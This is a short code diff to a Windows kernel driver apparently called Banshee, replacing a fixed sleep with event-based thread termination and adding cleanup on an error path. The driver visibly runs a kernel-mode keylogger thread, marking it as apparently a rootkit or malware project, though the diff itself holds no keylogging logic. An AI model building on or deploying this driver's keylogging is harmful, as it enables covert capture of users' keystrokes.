@@ -41,12 +41,9 @@ BeUnload()
     BeGlobals::shutdown = true;
     BeGlobals::logKeys = false;
 
-    // Wait for threads to stop running TODO: proper signaling via events?
-
-    LARGE_INTEGER interval;
-    interval.QuadPart = -1 * (LONGLONG)500 * 10000;
-    KeDelayExecutionThread(KernelMode, FALSE, &interval);
-
+    KeWaitForSingleObject(&BeGlobals::hKeyLoggerTerminationEvent, Executive, KernelMode, FALSE, NULL);
+    KeWaitForSingleObject(&BeGlobals::hMainLoopTerminationEvent, Executive, KernelMode, FALSE, NULL);
+    
     // Close thread handles
     ZwClose(hKeyloggerThread);
     ZwClose(hMainLoop);
@@ -186,6 +183,7 @@ BeMainLoop(PVOID StartContext)
         LOG_MSG("Set answerEvent\n");
     }
 
+    KeSetEvent(&BeGlobals::hMainLoopTerminationEvent, IO_NO_INCREMENT, FALSE);
     PsTerminateSystemThread(STATUS_SUCCESS);
 }
 
@@ -226,6 +224,8 @@ BansheeEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
     NtStatus = PsCreateSystemThread(&hMainLoop, THREAD_ALL_ACCESS, NULL, NULL, NULL, BeMainLoop, NULL);
     if (NtStatus != 0)
     {
+        BeGlobals::logKeys = false;
+        ZwClose(hKeyloggerThread);
         return NtStatus;
     }
 
